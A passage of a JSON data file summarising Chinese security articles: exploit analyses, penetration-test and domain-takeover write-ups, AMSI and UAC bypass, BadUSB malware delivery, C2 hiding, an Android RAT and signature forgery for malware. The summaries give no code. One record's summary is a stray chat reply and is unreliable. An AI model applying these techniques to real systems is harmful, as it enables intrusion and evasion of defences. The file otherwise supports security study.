        "FileName": "7966-Java代码审计之Struts2-003、005(三).pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 Arduino 制作 BadUSB 设备，通过模拟键盘操作，在插入计算机后自动执行预先写入的命令，从而下载并运行恶意软件。该过程涉及使用 Arduino IDE、云服务器和 BadUSB 设备，并详细说明了 BadUSB 的工作原理、工具准备、云服务器搭建、BadUSB 程序编写和 Phpstudy 部署。",
        "FileName": "8317-由Arduino制作badusb联动cs进行一插上线.pdf"
    },
    {
        "page_content": "**主题：** ThinkPHP6.0 任意文件写入漏洞复现\n\n**内容：** 该文档详细介绍了 ThinkPHP6.0 任意文件写入漏洞的复现过程，包括环境搭建、漏洞利用方法和官方修复方式。漏洞利用的关键在于控制 PHPSESSID cookie 的值，从而控制 session 文件名和内容，最终实现任意文件写入。",
        "FileName": "8546-Thinkphp6.0任意文件写入漏洞复现.pdf"
    },
    {
        "page_content": "该文档分析了 qdPM <9.1 中的远程代码执行漏洞 (CVE-2020-7246)，该漏洞允许攻击者通过删除 .htaccess 文件并上传恶意 PHP 文件来在用户目录中执行任意代码。该漏洞是由于在处理用户更新请求时未正确验证文件删除和上传操作造成的。",
        "FileName": "7795-qdPM 9.1 远程代码执行漏洞分析（CVE-2020-7246）.pdf"
    },
    {
        "page_content": "该文档分析了 nginxWebUi3.6.5 中的命令执行漏洞，该漏洞允许攻击者通过绕过对命令的校验来执行任意命令。攻击者可以通过设置 nginxExe 和 nginxPath 变量来绕过校验，然后使用 bash -c 选项执行命令。该漏洞已在 3.4.8 版本中修复，但可以通过直接设置变量来绕过修复。",
        "FileName": "12690-nginxWebUi3.6.5 命令执行挖掘.pdf"
    },
    {
        "page_content": "该文档介绍了 DVWA 靶场中的 CSRF 漏洞，包括不同安全级别的漏洞分析和利用方法。它强调了 CSRF 攻击的关键在于利用受害者的 cookie 向服务器发送伪造请求，并提供了绕过不同安全级别保护措施的具体示例。",
        "FileName": "12025-DVWA靶场之CSRF学习分享.pdf"
    },
    {
        "page_content": "Apache Dubbo 2.7.x、3.0.x 和 3.1.x 版本中的泛化调用功能存在反序列化漏洞（CVE-2023-23638），攻击者可利用该漏洞绕过防御机制，通过传入恶意类并调用其特定方法，实现代码执行。该漏洞可通过两种方式利用：利用 object.field.set 进行利用，绕过黑名单类检查，实现代码执行；利用 object.set+METHOD_NAME 进行利用，打开原生的 Java 反序列化接口，通过特定 gadget 实现 RCE。",
        "FileName": "12396-Apache dubbo 反序列化漏洞（CVE-2023-23638）分析及利用探索.pdf"
    },
    {
        "page_content": "该文档详细介绍了网络钓鱼的原理、步骤和技术，包括寻找目标、制作诱饵、抛竿、邮件伪造、网站克隆、前端页面克隆等，旨在帮助读者了解网络钓鱼的运作方式和防御措施。",
        "FileName": "12682-一文就学会网络钓鱼“骚”姿势.pdf"
    },
    {
        "page_content": "客户端跨站点请求伪造（客户端 CSRF ）是影响现代 Web 应⽤程序的新型 CSRF 漏洞。与更传统的 CSRF ⼀样，攻击者可以短暂访问恶意 URL ，从⽽诱骗受害者的浏览器以⽤户的名义向⽬标⽹站发送经过身份验证的，对安全性敏感的 HTTP 请求，⽽⽆需⽤户的同 意或意识到。在传统的 CSRF 中，易受攻击的组件是服务器端程序，该程序⽆法区分传⼊的身份验证请求是否是有意执⾏的，也 称为混淆代理问题。通常通过添加伪随机不可预测的请求参数，防⽌伪造或更改默认浏览器的⾏为并避免在跨站点请求中包含 HTTP cookie 。在客户端 CSRF 中，易受攻击的组件是 JavaScript 程序，它使攻击者可以通过修改 JavaScript 程序的输⼊参数来⽣成 任意请求。与传统的 CSRF 相反，现有的反 CSRF 对策不⾜以保护 Web 应⽤程序免受客户端 CSRF 攻击。",
        "FileName": "10990-JAW：针对Web应用程序的客户端CSRF漏洞检测工具.pdf"
    },
    {
        "page_content": "本文档探讨了如何手动绕过 Antimalware Scan Interface (AMSI) 的检测规则，该规则用于识别恶意软件。作者建议通过查找和修改触发检测的字符串来实现绕过，并提供了使用 AMSITrigger 工具进行测试的示例。此外，作者还介绍了使用编码、拼接和加密等技术来绕过 AMSI 的方法。",
        "FileName": "8283-手工绕过 AMSI - 第一部分.pdf"
    },
    {
        "page_content": "好的，我注意到了。",
        "FileName": "10955-从0开始学习Microsoft SQL Server数据库攻防.pdf"
    },
    {
        "page_content": "本文档分析了 Microsoft Exchange Proxylogon 漏洞利用链，该漏洞利用链允许攻击者绕过身份验证并模拟用户。该漏洞利用链涉及服务器端请求伪造 (SSRF) 和任意文件写入，攻击者可以使用这些漏洞在 Exchange 服务器上执行远程代码。文档还提供了检测和缓解此漏洞的步骤，包括运行 Microsoft 提供的脚本、检查服务器配置和审核日志。",
        "FileName": "9305-复现Microsoft Exchange Proxylogon漏洞利用链.pdf"
    },
    {
        "page_content": "这篇文档分析了一段自解密 Shellcode，该 Shellcode 具有自混淆和自解密的能力，通过逆向分析，文档将 Shellcode 拆解成解密器、密钥、payload 三个部分，并提供了生成自解密 Shellcode 的 PoC 代码。",
        "FileName": "12369-一段自解密 Shellcode 的逆向分析.pdf"
    },
    {
        "page_content": "该文档探讨了 SpringBoot 和 SpringMvc 中的 Context 对象，包括 RootContext 和 ChildContext。在 SpringMvc 中，通过 ContextLoaderListener 和 DispatcherServlet 加载不同的配置文件，分别创建 RootContext 和 ChildContext，它们之间存在继承关系。ChildContext 可以访问 RootContext 中的资源，但反之则不行。在 SpringBoot 中，采用了一种不同的方法，只有一个 RootContext，所有 Bean 都注册在其中，并且 ServletContext 的作用范围最大。",
        "FileName": "11814-SpringBoot和SpringMvc中的Context.pdf"
    },
    {
        "page_content": "本文分析了 10 道 XSS 实例，展示了如何绕过各种过滤规则构造恶意 payload。通过分析第九题，作者介绍了利用 `<!--<script>` 特性跳出 script 标签限制的思路，并通过嵌套模板字符串和对象构造绕过语法限制。第十题在第九题的基础上，利用了只有两个字符长度的限制，通过嵌套模板字符串和闭合字符绕过过滤。第八题则通过添加 </script> 标签闭合绕过过滤。其他解法思路也提供了不同的构造方法，展示了 XSS 绕过的灵活性。",
        "FileName": "11705-一些BAT的XSS实例（四）高级篇.pdf"
    },
    {
        "page_content": "该文档介绍了如何在 Windows 权限维持场景中通过修改服务的安全描述符定义语言 (SDDL) 语法来隐藏服务信息，从而逃避检测。通过拒绝交互式用户、系统用户和管理员组对服务的特定权限，可以实现服务的持久隐藏，使其无法通过常规服务控制工具检索到信息。即使蓝队知道被隐藏的服务名称，也可以通过尝试停止服务来判断其存在，因为隐藏的服务在停止时会提示不同的异常。该思路可用于在红蓝对抗中进行隐藏后门的权限维持，即使目标系统重启，隐藏服务也会自动启动。",
        "FileName": "8420-思路分享：windows权限维持场景中如何隐藏服务信息.pdf"
    },
    {
        "page_content": "该文档介绍了远线程注入技术，它允许一个进程在另一个进程中创建线程，从而可以注入shellcode、DLL或代码。该技术涉及使用OpenProcess、VirtualAllocEx、WriteProcessMemory、CreateRemoteThread、CreateToolhelp32Snapshot、Process32First和Process32Next函数，并通过遍历当前进程向指定进程注入shellcode。",
        "FileName": "10944-远线程注入+IAT隐藏过杀软.pdf"
    },
    {
        "page_content": "该文档记录了一次域渗透过程，从获得一个 webshell 开始，通过 IPC 连接和计划任务上线，抓取密码，横向渗透，最终拿下域控。",
        "FileName": "8597-记一次域渗透2.pdf"
    },
    {
        "page_content": "该文档分析了堆攻击迭代历程，重点介绍了堆的定义、堆攻击的漏洞类型，并提供了利用堆溢出和UAF漏洞进行攻击的示例代码。",
        "FileName": "12824-堆攻击迭代历程（以一题为例）.pdf"
    },
    {
        "page_content": "该文档详细介绍了 CVE-2021-44077 漏洞，该漏洞影响 Zoho ManageEngine ServiceDesk Plus，允许未经身份验证的远程代码执行。它描述了漏洞的利用过程，包括上传恶意文件、执行命令和绕过身份验证。该漏洞影响版本 11200 至 11303，可以通过构造特定 URL 和利用 RestAPI 来利用。",
        "FileName": "10631-CVE-2021-44077 Zoho ManageEngine ServiceDesk Plus Pre-auth RCE.pdf"
    },
    {
        "page_content": "该文档详细描述了一次对某网站的渗透测试，发现了多个漏洞，包括任意用户注册、任意用户密码重置、水平越权、存储型 XSS、SQL 注入等，并提供了具体的漏洞利用方法和绕过 WAF 的技巧。",
        "FileName": "11502-记一次对某站点详细的渗透测试.pdf"
    },
    {
        "page_content": "该文档分析了 UAF 漏洞的原理，并提供了利用该漏洞的示例代码。UAF 漏洞是指内存块在释放后，其对应的指针没有被设置为 NULL，导致攻击者可以再次申请该内存块，从而达到攻击效果。文档中给出的示例代码利用了结构体实现了在 chunk 的 content 内容下执行一个 puts 函数，然后再嵌套一个 chunk，通过释放和申请内存块的操作，最终可以调用 magic 函数。",
        "FileName": "12261-UAF漏洞利用.pdf"
    },
    {
        "page_content": "该文档详细介绍了作者从外围打点到内网渗透拿下域控的过程，包括信息收集、漏洞利用、密码抓取、域内信息收集、存活机器及资产搜集、拿下域控获取hash等步骤，展示了作者在内网渗透方面的技术和思路。",
        "FileName": "9477-从外围打点到内网渗透拿下域控.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何利用内网渗透技术，通过FTP上传和脚本注入，绕过GD库，在目标服务器上获取shell权限。此外，还介绍了如何使用frp代理工具和redis漏洞利用技术，进一步探索内网环境，并最终通过ssh连接到目标服务器。",
        "FileName": "8089-记一次内网渗透.pdf"
    },
    {
        "page_content": "Nacos 身份认证绕过漏洞（QVD-2023-6271）允许攻击者绕过密钥认证，进入后台并控制系统，原因是 Nacos 在默认配置下未修改 token.secret.key，导致攻击者可以使用固定密钥构造 JWT 访问后台。",
        "FileName": "12313-nacos token.secret.key身份认证绕过漏洞(QVD-2023-6271).pdf"
    },
    {
        "page_content": "本文探讨了第三方登录中存在的安全漏洞，重点关注通过 JavaScript 跳转造成的 XSS 攻击。攻击者可以通过修改登录链接中的参数，在脚本块中获得可控点，从而劫持用户身份认证信息。文章还介绍了其他利用方法，并提供了修复建议，包括转义特殊字符、使用伪协议和验证 referer。",
        "FileName": "7360-关于第三方登陆我们还能做些什么.pdf"
    },
    {
        "page_content": "本文主要介绍了利用 shiro 反序列化注入冰蝎内存马的方法，包括利用 shiro 反序列化注入冰蝎内存马的原理、具体步骤和绕过 maxHttpHeaderSize 的方法。",
        "FileName": "10696-利用shiro反序列化注入冰蝎内存马.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Flink 中的 CVE-2020-17519 漏洞，该漏洞允许攻击者通过 JobManager REST 接口读取 JobManager 本地文件系统上的任意文件，影响版本为 1.11.0、1.11.1 和 1.11.2，修复方法是升级到 1.11.3 或 1.12.0。",
        "FileName": "8992-漏洞分析 - Apache Flink 任意文件读取漏洞(CVE-2020-17519).pdf"
    },
    {
        "page_content": "Apache Skywalking 远程代码执行漏洞分析报告指出，Skywalking 历史存在两次 SQL 注入漏洞（CVE-2020-9483、CVE-2020-13921），此次漏洞（Skywalking 小于 v8.4.0）是由于之前两次 SQL 注入漏洞修复并不完善，仍存在一处 SQL 注入漏洞。结合 h2 数据库（默认的数据库），可以导致 RCE。",
        "FileName": "9217-Skywalking远程代码执行漏洞分析.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 SOME 攻击绕过 XSS 过滤，通过在 code 参数中指定有效负载并滥用 encodeURI 函数来控制 callback 参数，从而在目标网站上执行任意 JavaScript 代码。该攻击利用了目标网站中对 code 参数长度和 callback 参数过滤的不足，并通过 iframe 和跨 iframe 操作将 payload 逐步加载到 DOM 中，最终执行 alert(document.domain) 命令。",
        "FileName": "8075-一道xss题学习SOME攻击.pdf"
    },
    {
        "page_content": "该文档描述了 CVE-2019-8449 漏洞，该漏洞影响 Atlassian Jira 8.4.0 之前的版本，允许未经授权的查询员获取用户信息，包括用户名、部门和职位。该漏洞评级为低危，建议通过升级 Jira 至最新版本或配置安全组来修复。",
        "FileName": "7219-CVE-2019-8449JIRA信息泄漏漏洞排查.pdf"
    },
    {
        "page_content": "该文档主要介绍了数论中的一些基本概念和算法，包括素数、最⼤公约数、最⼩公倍数、模反元素、同余、模运算、欧拉函数、欧拉定理、费⻢⼩定理、欧⼏⾥得算法、拓展欧⼏⾥得算法和⻉祖等式。这些概念和算法在密码学中有着广泛的应⽤，特别是 RSA 算法中。",
        "FileName": "12706-RSA系列之数论上.pdf"
    },
    {
        "page_content": "这篇文档详细介绍了针对内部红蓝对抗的攻击路径，包括利用 cve-2022-36804 执行命令、记录密码、利用 javaAgent 内存钩子修改 jvm 虚拟机正在执行的代码、上传文件、注入 bitbucket 进程、获取账户密码、利用 .net 源码中的密钥、绕过 edr、使用 clr 绕过杀软、导出 ldap 信息、spn 及票据、利用 adcs 服务器提权、获取域控的机器 hash、使用 secretdump 导出域控的机器 hash、使用域控的机器 hash 获得所有的 hash、使用 HackBrowserData ⼯具抓取浏览器信息、使用 schtasks 以 dashe 的身份执行命令、获取 masterkey、伪造 masterkey、导⼊浏览器插件 CookieEditor、使用 mimikatz 伪造 masterkey、使用 dpapi 生成新的 masterkey ⽂件、重启 chrome 导⼊ cookie、获得最后的 flag。",
        "FileName": "12416-记一次团队内部的红蓝对抗-攻击篇.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Weblogic T3 协议反序列化漏洞（CVE-2015-4852），包括漏洞原理、环境搭建、漏洞复现、漏洞分析和修复措施，重点讲解了 T3 协议的组成和在 Weblogic 反序列化中的利用，以及 resolveClass 在防御反序列化方面的应用。",
        "FileName": "10365-Weblogic漏洞学习：T3反序列化.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 CypherRat，一种安卓远控工具，包括其功能、安装和使用说明。它强调了该工具的图形化界面、演练和实战用途，并提供了反编译和重新打包 APK 以增强隐蔽性的步骤。此外，文档还涵盖了监控、键盘记录、摄像头访问、工具和收藏等功能。",
        "FileName": "12474-CypherRat使用.pdf"
    },
    {
        "page_content": "该文档分析了 house of cat 攻击手法，该手法利用 glibc 2.23 中的任意地址写堆地址漏洞，通过劫持 stderr 指针，修改 vtable 指针，触发 IO 流操作，最终控制程序流，执行 rop 链获取 flag。",
        "FileName": "12349-house of cat 心得体会.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 CDN 域前置和云函数来隐匿 C2 服务器，以提高其安全性。通过将 C2 服务器隐藏在 CDN 节点后面，可以防止流量设备检测到其真实 IP 地址，从而增强其隐蔽性。此外，文档还提供了使用 Nginx 反向代理和云函数来进一步增强隐匿性的方法。",
        "FileName": "12624-C2隐匿-云函数&域前置.pdf"
    },
    {
        "page_content": "**主题：**某次渗透测试中利用 SQL 注入漏洞获取管理员账号，并通过上传 ASPX webshell 反弹 CS shell 提权。\n\n**内容：**在一次渗透测试中，作者发现了一个智慧校园管理系统存在 SQL 注入漏洞，利用该漏洞获取了管理员账号。由于无法直接在 web 目录写 shell，作者上传了一个 ASPX webshell，并通过上传 web.config 文件增加文件执行权限，最终成功解析 ASP webshell。为了绕过流量检测，作者利用合法证书加密 CS 流量，并通过修改 CS profile 指定证书，成功反弹 CS shell。最后，作者利用 ms16-075 补丁成功提权。",
        "FileName": "8493-某HW行动中的一次渗透测试.pdf"
    },
    {
        "page_content": "该文档分析了米酷 CMS 中的两个 SQL 注入漏洞，第一个漏洞位于注册处，攻击者可以通过添加单引号来绕过用户名验证，第二个漏洞位于管理员编辑处，攻击者可以通过修改 ID 参数来注入 SQL 语句，并使用基于时间的盲注技术来获取信息。",
        "FileName": "8486-米酷cms代审记录.pdf"
    },
    {
        "page_content": "本文档探讨了内网渗透中转发代理的概念和技术，包括端口映射、Socket 协议、Socks 协议、正向代理、反向代理以及使用 reGeorg、Tunna、Lcx、NC 等工具进行内网代理转发的具体方法。",
        "FileName": "8658-内网渗透  转发代理.pdf"
    },
    {
        "page_content": "该文档包含了 2020 年 Hackergame 竞赛中四个签到题的解题方法，涉及滑块拖动、JavaScript 代码修改、字符串替换、编程求解等技术，以及一个世界模拟器、一个 Quine 程序、一个字符串大写工具、一个 UTF-7 转换工具的解题思路。",
        "FileName": "12179-Hackergame 2020.pdf"
    },
    {
        "page_content": "本文档主题是格式化字符串漏洞，内容包括格式化字符串函数的定义、格式化字符串漏洞的成因、格式化字符串漏洞的利用方法以及格式化字符串漏洞的防御措施。",
        "FileName": "12712-格式化字符串详解.pdf"
    },
    {
        "page_content": "该文档详细分析了 Java 某 CMS 的代码审计，重点关注任意文件删除、任意文件读取和绕过备份 getshell 等漏洞。通过对登录、添加管理员、修改密码等功能点的分析，发现了越权修改密码、任意文件下载突破、任意文件删除和系统文件备份 getshell 等漏洞，并提供了详细的复现步骤。",
        "FileName": "10092-java某cms代码审计（二）.pdf"
    },
    {
        "page_content": "该文档分析了 Android 恶意软件家族 Joker 的最新发展，重点关注其通过 Beauty Wallpaper HD 恶意应用程序传播的活动。该恶意软件通过订阅收费服务和窃取用户隐私来获利。文档提供了恶意软件的详细技术分析，包括其命令执行、远程指令执行和数据收集功能。它还提供了安全建议，以帮助用户避免感染此恶意软件。",
        "FileName": "12882-Spyware.Joker分析报告.pdf"
    },
    {
        "page_content": "Monstra CMS 3.0.4 版本存在一个远程代码执行漏洞（CVE-2020-13384），由于程序没有正确验证文件扩展名，攻击者可以上传特殊后缀的文件（如 php7、pht）来执行任意 PHP 代码，但该漏洞的触发取决于具体环境，如 Apache 版本和配置。",
        "FileName": "7850-Monstra CMS RCE漏洞分析（CVE-2020-13384）.pdf"
    },
    {
        "page_content": "该文档分析了 JNDI（Java 命名和目录接口）和 log4j 中的漏洞，这些漏洞允许攻击者通过远程加载恶意类来执行任意代码。文档详细介绍了漏洞的成因、利用过程以及绕过缓解措施的方法。",
        "FileName": "11056-从JNDI到log4j.pdf"
    },
    {
        "page_content": "该文档详细描述了作者在挖掘教育网站时发现的曲折的 SQL 注入漏洞，通过使用各种技术，包括字符模糊、联合查询和布尔盲注，作者最终成功利用该漏洞获取了后台登录凭据，并尝试上传 JSP 文件以获取 shell，但由于文件包含功能的限制而失败。",
        "FileName": "9448-记一次曲折的edu挖洞.pdf"
    },
    {
        "page_content": "Cross-site leaks（又称 XS-Leaks、XSLeaks）是一类源自 Web 平台内置的侧通道的漏洞。它们利用网络的可组合性核心原则，允许网站相互交互，并滥用合法机制来推断有关用户的敏感信息。XS-Leaks 与 CSRF 类似，但主要区别在于 CSRF 用于让受害者执行某些操作，而 XS-Leaks 用于探测用户敏感信息。",
        "FileName": "11306-浅谈XS-Leaks之Timeless timing attck.pdf"
    },
    {
        "page_content": "该文档分析了 PHPYUN 人才系统中一个正常函数不正常使用的逻辑隐患，该隐患源于 `update_once` 函数在更新数据时没有对用户身份进行验证，导致攻击者可以修改其他用户的简历信息。漏洞利用前提条件包括：POST 请求包含 `submit` 参数、`eid` 参数为有效简历 ID、传递的参数必须是目标表的字段。攻击者可以通过在请求包中添加 `uid` 参数来修改其他用户的简历归属。",
        "FileName": "7815-PHPYUN人才系统一个正常函数不正常用法引发的逻辑隐患(审计思路).pdf"
    },
    {
        "page_content": "该文档分析了 Dedecms_V5.8.1 中存在的远程代码执行 (RCE) 漏洞，该漏洞存在于 /plus/flink.php 文件中。攻击者可以通过精心设计的请求将恶意代码注入到网站的模板文件中，从而在服务器上执行任意代码。文档详细描述了漏洞的利用链，包括如何绕过安全检查并最终执行恶意代码。",
        "FileName": "10390-Dedecms_V5.8.1 RCE.pdf"
    },
    {
        "page_content": "该文档探讨了滥用 Active Directory 访问控制列表 (ACL) 的技术，重点关注攻击者感兴趣的特定权限，例如 WriteOwner、WriteDACL、GenericAll、Self(Self-Membership)、GenericWrite、AllExtendedRights 和 WriteProperty。它提供了利用这些权限的示例，包括更改密码、添加用户到组、修改对象所有者和执行基于资源的约束委派。",
        "FileName": "9997-Abusing AD ACL.pdf"
    },
    {
        "page_content": "本文介绍了一种名为 Serverless 扫描技术的隐匿扫描技术，该技术利用 Serverless（云函数）实现各种扫描器探测功能，绕过态势感知、WAF 等安全设备，增加蓝队溯源难度，实现封无可封、查无可查的效果。",
        "FileName": "10612-Serverless扫描技术研究及应用.pdf"
    },
    {
        "page_content": "这篇文档探讨了网络空间测绘溯源技术，包括其概念、应用场景、基本问题（“What？Where？Who？”）、三大概念（行为测绘、动态测绘、交叉测绘）、指纹概念以及在溯源中的应用。该技术通过探测全球互联网空间上的节点分布情况和网络关系索引，构建全球互联网图谱，用于识别未知资产、快速排查暴露资产、支持红蓝对抗和收集脆弱资产信息。",
        "FileName": "10773-网络空间测绘溯源技术剖析.pdf"
    },
    {
        "page_content": "本文档介绍了如何使用 Frida 框架穿透加固的 Android 应用程序的 Java 层，以绕过限制并获得 VIP 权限。该方法涉及使用 Frida 脚本注入到目标应用程序中，并修改特定类中的方法以返回所需的 VIP 数据。",
        "FileName": "7670-使用Frida给apk脱壳并穿透加固Hook函数.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 Nacos 结合 Spring Cloud Gateway 中的 RCE 漏洞，通过动态配置路由，执行 SpEL 表达式注入漏洞，从而在无法访问 Actuator API 的情况下执行任意命令。该漏洞利用了 Nacos 的动态配置特性，结合 Spring Cloud Gateway 的 RCE 漏洞，为攻击者提供了新的利用途径。",
        "FileName": "11493-Nacos结合Spring Cloud Gateway RCE利用.pdf"
    },
    {
        "page_content": "该文档分析了 Laravel 中的 Cookie 伪造漏洞，该漏洞允许攻击者通过构造合法密文来伪造 cookie，从而在 Session handler 为 cookie 时造成远程命令执行。补丁通过在 cookie-value 前拼接 cookie-name 与加密密钥的 hash 来修复此漏洞，确保攻击者无法伪造合法的 cookie-value。受影响的版本包括 Laravel <=7.21.0 和 <=6.18.26，已在 7.22.0 和 6.18.27 中修复。",
        "FileName": "8243-Laravel Cookie伪造漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了一个恶意软件样本，该样本通过 PowerShell 脚本执行，并下载了两个 PE 文件。第一个 PE 文件是一个反射性 PE 注入工具，用于加载第二个 PE 文件，该文件可能是后门。分析表明，恶意软件通过 Cloudflare CDN 节点连接到一个域名，并从该域名下载了 PE 文件。",
        "FileName": "10814-记一次对恶意软件的简单分析.pdf"
    },
    {
        "page_content": "该文档记录了一次 Java 代码审计，重点关注注册、登录、文件上传、SQL 注入和模块文件读取等方面。审计发现了一个文件读取漏洞，允许攻击者读取根目录下的文件，包括数据库配置文件，以及一个任意文件删除漏洞，允许攻击者删除 Web 目录中的文件。",
        "FileName": "10198-记一次java代码审计.pdf"
    },
    {
        "page_content": "该文档介绍了如何将数字爬虫 crawlergo 与被动扫描器 XRAY 结合使用，以增强网络安全扫描。它提供了详细的步骤，包括下载和配置软件、配置爬虫和扫描器设置，以及运行脚本以执行扫描。该脚本利用 crawlergo 的动态爬虫功能和 XRAY 的被动扫描功能，以识别子域名和 URL，并生成包含扫描结果的文本文件。",
        "FileName": "7047-数字crawlergo动态爬虫结合长亭XRAY被动扫描.pdf"
    },
    {
        "page_content": "该文档探讨了用户帐户控制 (UAC) 的工作原理，以及如何绕过 UAC 以获得管理员权限。它描述了 UAC 的不同授权级别，并提供了用于查找和利用不弹出 UAC 提示的程序的脚本。该文档还介绍了如何修改注册表以绕过 UAC，并讨论了使用恶意软件绕过 UAC 的潜在风险。",
        "FileName": "10423-关于bypassuac的探究.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 Docker 搭建 SonarQube 代码质量平台环境，包括安装 Docker Compose、配置数据库和 SonarQube 服务、设置系统参数、访问 SonarQube 界面、安装中文插件、配置 Maven 和 SonarQube 集成、使用 Maven 实现代码检测、使用 Sonar-scanner 实现代码检测、在 Jenkins 中集成 SonarQube 实现代码扫描以及配置 Jenkins 的 SonarQube 信息。",
        "FileName": "12785-代码质量平台Sonarqube.pdf"
    },
    {
        "page_content": "CVE-2022-0415 漏洞利用了 gogs 上传时缺乏对参数值的判断，实现了命令的注入；再根据 git 特性，命令可在 gogs 中被执行。该漏洞影响 0.12.6 以下的版本，修复详情包括在上传文件时增加对 TreePath 的检测，防止上传文件到 \".git\" 目录。",
        "FileName": "11302-漏洞分析 - gogs RCE (CVE-2022-0415).pdf"
    },
    {
        "page_content": "这篇文档介绍了渗透测试中针对教育机构网站（edu）的基本流程，包括确定站点、收集 C 段、寻找薄弱点、利用漏洞和绕过白名单等步骤。文档还提供了具体工具和技巧，如使用 Fofa 采集信息、利用 SQLmap 获取 OS-shell 等，并分享了作者在渗透测试中的经验和心得。",
        "FileName": "9700-实战  一次基本的edu挖掘流程.pdf"
    },
    {
        "page_content": "本文档详细介绍了 Cobalt Strike 的基础原理、破解方法、CDN+反向代理隐藏 Teamserver Domain、DNS 上线以及一个未填的坑。作者分享了个人在研究和使用 Cobalt Strike 中遇到的问题和解决办法，包括破解授权、添加 Listener 的注意事项以及 DNS 上线时遇到的一个未解决的问题。",
        "FileName": "7375-Cobalt Strike折腾踩坑填坑记录.pdf"
    },
    {
        "page_content": "本文详细描述了作者通过供应链攻击，利用供应商公司提供的医疗信息系统漏洞，逐步获取目标医院微信公众号后台权限的过程。作者通过分析供应商公司的域名和子域名，发现了一个可公开访问的 GitLab 仓库，从中获取了 Oracle 数据库的连接信息。利用该信息，作者成功连接到数据库并添加用户，获得了供应商公司官网后台的用户名和密码。最终，作者通过盲猜网站目录名，成功写入 Webshell 并提权，获得了远程桌面登录权限。",
        "FileName": "10531-记一次通过供应链拿到目标后台权限的过程.pdf"
    },
    {
        "page_content": "本文档介绍了在 Windows Server 2012 环境中使用 PowerShell 模拟键盘下载 mimikatz 脚本的攻击手法。作者在复现过程中遇到了路径错误和光标位置问题，通过修改脚本和使用纯英文键盘解决了这些问题，最终成功执行了 mimikatz。作者还讨论了这种攻击手法的免杀效果，认为它取决于下载的 PowerShell 脚本，并建议使用其他免杀过的脚本来扩展攻击范围。",
        "FileName": "7513-att&ck奇妙历险记——powershell模拟键盘下载的踩坑过程.pdf"
    },
    {
        "page_content": "该文档记录了一次对校内获奖提交申报平台的渗透测试，该平台未接入深信服 waf，导致渗透过程异常轻松。测试人员发现了越权、任意文件上传和下载、任意权限用户添加等漏洞，并提供了详细的漏洞利用方法和构造数据包的示例。",
        "FileName": "12391-记一次校内站点的渗透测试.pdf"
    },
    {
        "page_content": "本文分析了 PHP 中的垃圾回收机制，重点介绍了如何利用该机制绕过异常抛出，并提供了多个示例演示了在 PHP 反序列化和 Phar 反序列化中的应用。",
        "FileName": "11843-浅析PHP GC垃圾回收机制及常见利用方式.pdf"
    },
    {
        "page_content": "**文档主题：** CVE-2021-22555 Linux Netfilter 模块中的堆上 off-by-null 溢出漏洞分析与利⽤\n\n**文档内容：**\n\n该漏洞是由 Linux Netfilter 模块中的堆溢出漏洞引起的，获得了 7.8 的 CVSS 评分。漏洞主要发⽣在 64 位系统为 32 位进程处理 sets ocket opt 时，若指定了 optname 为 IPT_SO_SET_REPLACE 且开启了内核选项 CONFIG_USER_NS 和 CONFIG_NET_NS，在内核结构转换时由于错误计算转换⼤⼩则会导致内核堆上的越界写⼊⼀些 0 字节，从⽽覆写相邻 object。该漏洞⾃内核版本 4.19-rc1 以来就已存在，在这些版本中被修复：5.12、5.10.31、5.4.113、4.19.188、4.14.231、4.9.267、4.4.267。\n\n**利⽤方法：**\n\n1. 隔离出独⽴命名空间，并绑定到固定核⼼。\n2. 堆喷 msg_msg，建⽴主从消息队列，构造重叠辅助消息。\n3. 释放辅助消息，构建 UAF。\n4. 堆喷 sk_buff，伪造辅助消息，泄露 UAF obj 地址⾄于这个地址减去 0x400 便能得到我们的 UAF 对象地址。\n5. 伪造 msg_msg->next 指向我们的 UAF object 相邻的辅助消息对应的主消息头部往前，从⽽读出该主消息的头 部，泄露出对应的辅助消息的地址。\n6. 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权。",
        "FileName": "12440-CVE-2021-22555 内核堆上 off-by-null 溢出漏洞分析与利用.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2020-14645 漏洞，该漏洞利用了 Weblogic UniversalExtractor 中的反射提取器绕过，通过在 UniversalExtractor 类中调用 extractComplex 方法，可以任意调用任意类的任意方法，从而导致命令执行。文档还提供了利用该漏洞的 POC 代码，并建议通过安装补丁、加入黑名单或限制 T3/IIOP 协议来修复该漏洞。",
        "FileName": "11964-CVE-2020-14645 Weblogic UniversalExtractor Bypass ReflectionExtractor via T3 protocol.pdf"
    },
    {
        "page_content": "《透视 APT》一书深入探讨了高级持续性威胁 (APT) 攻击的特性、目标、技术和防御措施。APT 攻击以其高度针对性、持续性和隐蔽性为特征，主要针对政府、国防、金融和能源等关键行业。该书分析了 APT 组织的运作方式、使用的工具和技术，并提供了应对和防御 APT 攻击的建议。",
        "FileName": "8335-《透视APT》读书笔记.pdf"
    },
    {
        "page_content": "该文档介绍了如何复现和利用 Apache Struts 2.5.25 中的 S2-061 远程代码执行漏洞（CVE-2020-17530），并提供了批量检测和利用脚本。该漏洞允许攻击者通过精心设计的 HTTP 请求在目标服务器上执行任意命令，从而获得对服务器的完全控制。",
        "FileName": "8689-S2-061远程代码执行漏洞复现及批量检测、利用脚本（CVE-2020-17530）.pdf"
    },
    {
        "page_content": "httpx 是一个多功能的 HTTP 工具包，允许使用 retryablehttp 库运行多个探测器，它旨在通过增加线程来保持结果的可靠性。该文档分析了 httpx 的源代码，重点介绍了其并发处理、基于 HTTP 的探测器、HTTP2.0 和管道传输支持、证书信息提取、虚拟主机检测以及自动文件描述符最大值增加等优化。",
        "FileName": "9759-projectdiscovery之httpx源码学习.pdf"
    },
    {
        "page_content": "该文档探讨了签名伪造的技术，重点关注如何伪造 UAC 认证以使恶意软件看起来更真实。它介绍了伪造签名的方法，包括生成自签名根证书、使用该证书签发子证书、将公钥证书转换为 SPC 格式、将公钥证书和私钥合并为 PFX 格式的证书文件，以及为恶意软件签名。该文档还讨论了在虚拟机中导入证书以使签名生效的必要性，并提出了使用特制证书绕过流量查杀的可能性。",
